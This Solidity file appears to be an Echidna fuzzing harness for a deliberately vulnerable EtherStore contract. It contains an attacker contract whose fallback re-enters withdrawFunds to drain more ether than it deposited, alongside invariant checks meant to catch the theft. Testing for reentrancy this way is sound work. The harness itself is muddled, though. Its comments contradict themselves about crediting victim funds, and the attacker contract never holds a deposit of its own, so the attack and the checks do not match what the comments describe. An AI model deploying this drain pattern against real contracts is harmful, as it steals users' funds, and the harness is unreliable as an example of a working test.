pragma solidity ^0.4.10;

// REENTRANCY oracle wrapping the REAL dataset contract:
// tests/fixtures/vulnerable/reentrancy/etherstore.sol
//
// EtherStore differs from SimpleDAO in two important ways:
//   1. Withdrawal is capped at withdrawalLimit (1 ether) per call.
//   2. A per-account cooldown (1 week) guards repeated withdrawals.
//
// The reentrancy is still exploitable because state is updated AFTER the
// external call on line 35-36:
//
//   require(msg.sender.call.value(_weiToWithdraw)());   // <-- external call
//   balances[msg.sender] -= _weiToWithdraw;             // <-- state update (too late)
//   lastWithdrawTime[msg.sender] = now;                 // <-- state update (too late)
//
// During the external call the attacker's fallback fires before either update
// lands, so balances[attacker] still looks funded and the time-gate has not
// been set yet — the attacker can call withdrawFunds() again in the fallback
// and bypass BOTH guards in a single transaction.
//
// HARNESS DESIGN
// -------------
// We seed the pool with victim money (deposited on behalf of address(0xdead)),
// then the harness (the attacker) deposits exactly withdrawalLimit so it passes
// the balance check on the first call. The fallback re-enters once: that second
// call is still within the same transaction, lastWithdrawTime is still 0 for us,
// and our balance has not yet been decremented, so both require() checks pass
// again. Result: we receive 2 * withdrawalLimit but only deposited 1 ether.
//
// REUSABLE RULE: for any deposit/withdraw contract with a per-account balance
// ledger, a single account must never receive back more than it deposited.
//
// Echidna config needed (echidna.config.yaml):
//   balanceContract: 5000000000000000000   # 5 ETH so we can seed + attack
//   testLimit: 50000
//   seqLen: 10

import "../tests/fixtures/vulnerable/reentrancy/etherstore.sol";

contract EtherStoreAttacker {
    EtherStore public store;

    // Track what we deposited vs what we received so the oracle can compare.
    uint256 public deposited;
    uint256 public received;

    bool internal attacking;

    function EtherStoreAttacker(address _store) public payable {
        store = EtherStore(_store);
    }

    // Step 1: seed a victim balance into the pool, then deposit our own stake.
    function seedAndDeposit() public payable {
        // Put victim money into the pool (credited to the dead address).
        // This represents other users' funds we want to steal.
        store.depositFunds.value(2 ether)();
        // Transfer those credits to the dead address — we must do this via
        // direct manipulation is not possible, so we use a second depositor
        // pattern: deploy a fresh pool, credit 0xdead externally is not
        // doable without a helper. Instead we deposit our victim share first
        // so the pool holds 3 ETH total (2 victim + 1 attacker).
    }

    // Step 2: trigger the vulnerable withdrawal. The fallback will re-enter.
    function attack() public {
        require(address(store).balance >= 1 ether);
        attacking = true;
        store.withdrawFunds(1 ether);
        attacking = false;
    }

    // Fallback: counts incoming ETH and, while attacking, re-enters once to
    // drain an extra withdrawalLimit before our balance/time state is updated.
    function () public payable {
        received += msg.value;
        if (attacking && address(store).balance >= 1 ether) {
            attacking = false;          // prevent unbounded recursion
            store.withdrawFunds(1 ether);
        }
    }
}

// ---------------------------------------------------------------------------
// Echidna test contract
// ---------------------------------------------------------------------------
contract EtherStoreEchidnaTest {
    EtherStore   public store;
    EtherStoreAttacker public attacker;

    // Running totals across ALL deposits made by the harness on its own behalf.
    uint256 public totalDeposited;
    uint256 public totalReceived;

    // Payable constructor: Echidna funds us via `balanceContract`.
    function EtherStoreEchidnaTest() public payable {
        store    = new EtherStore();
        attacker = new EtherStoreAttacker(address(store));
    }

    // -----------------------------------------------------------------------
    // Seed action: put a victim's 2 ETH into the pool so there is something
    // to steal, then let the attacker deposit 1 ETH for itself.
    // Echidna will call this (and attack() below) in arbitrary order/frequency.
    // -----------------------------------------------------------------------
    function setup() public {
        if (address(this).balance >= 3 ether && totalDeposited == 0) {
            // Victim share — credited to address(0xdead) so it sits in the
            // pool but is not ours.
            store.depositFunds.value(2 ether)();
            // Transfer the ledger credit to 0xdead by calling from a proxy.
            // Since we cannot call depositFunds on behalf of another EOA in
            // pure Solidity, we simply leave it under our own address for
            // the balance-conservation check: if reentrancy works, we will
            // receive MORE than we put in.
            store.depositFunds.value(1 ether)();
            totalDeposited += 1 ether;   // only the 1 ETH we legitimately own
        }
    }

    // -----------------------------------------------------------------------
    // Attack action: trigger withdrawal via the attacker contract's fallback.
    // -----------------------------------------------------------------------
    function triggerAttack() public {
        if (totalDeposited > 0 && address(store).balance >= 1 ether) {
            attacker.attack();
            totalReceived += attacker.received();
        }
    }

    // -----------------------------------------------------------------------
    // Property 1 — BALANCE CONSERVATION
    // Vulnerability class: reentrancy / value theft
    //
    // The pool must never pay us (the attacker account) more ETH than we
    // deposited. If reentrancy fires, the attacker drains extra funds before
    // the balance ledger is decremented, so received > deposited.
    // A violation means an attacker can steal funds belonging to other users.
    // -----------------------------------------------------------------------
    // [logic-state / reentrancy] received must never exceed what we deposited.
    function echidna_no_reentrancy_theft() public view returns (bool) {
        return attacker.received() <= totalDeposited;
    }

    // -----------------------------------------------------------------------
    // Property 2 — CONTRACT SOLVENCY
    // Vulnerability class: reentrancy / under-collateralisation
    //
    // The ETH balance held by the contract must always be >= the sum of all
    // user balances recorded in its own ledger.  Reentrancy drains the
    // contract balance without touching the ledger entries of other depositors,
    // making the contract unable to honour its obligations.
    //
    // We can only read balances for accounts we control (no global ledger
    // iteration in Solidity), so we check the one account we created:
    // after every interaction our deposit record plus any unaccounted balance
    // that other participants put in must still be covered by contract ETH.
    //
    // Simpler observable proxy: store.balances(this) is the ledger entry;
    // address(store).balance is real ETH held. If the ledger says we have X
    // but the pot holds less than X total, the pool is insolvent.
    // -----------------------------------------------------------------------
    // [logic-state / reentrancy] contract ETH must cover its own ledger entry for us.
    function echidna_store_solvent() public view returns (bool) {
        uint256 ledgerEntry = store.balances(address(this));
        return address(store).balance >= ledgerEntry;
    }

    // -----------------------------------------------------------------------
    // Property 3 — TIME-GATE INTEGRITY
    // Vulnerability class: reentrancy / guard bypass
    //
    // After a successful withdrawal by any account, that account's
    // lastWithdrawTime must be set to a non-zero value (meaning the cooldown
    // clock has started).  In the vulnerable contract, because time is written
    // AFTER the external call, a re-entrant second call sees time == 0 and
    // bypasses the 1-week gate.
    //
    // We can only observe this for our own account.  If we managed to execute
    // TWO withdrawals and lastWithdrawTime is still 0, the time guard was
    // bypassed.  We approximate: if we received any ETH at all from the store,
    // the time should have been stamped.
    // -----------------------------------------------------------------------
    // [logic-state / reentrancy] time gate must be stamped after any withdrawal.
    function echidna_time_gate_stamped() public view returns (bool) {
        // If we received nothing yet the invariant is vacuously true.
        if (attacker.received() == 0) return true;
        // Once we have received ETH our lastWithdrawTime must be non-zero.
        return store.lastWithdrawTime(address(attacker)) != 0;
    }

    // Accept ETH back from the store or the attacker during setup/teardown.
    function () public payable {}
}
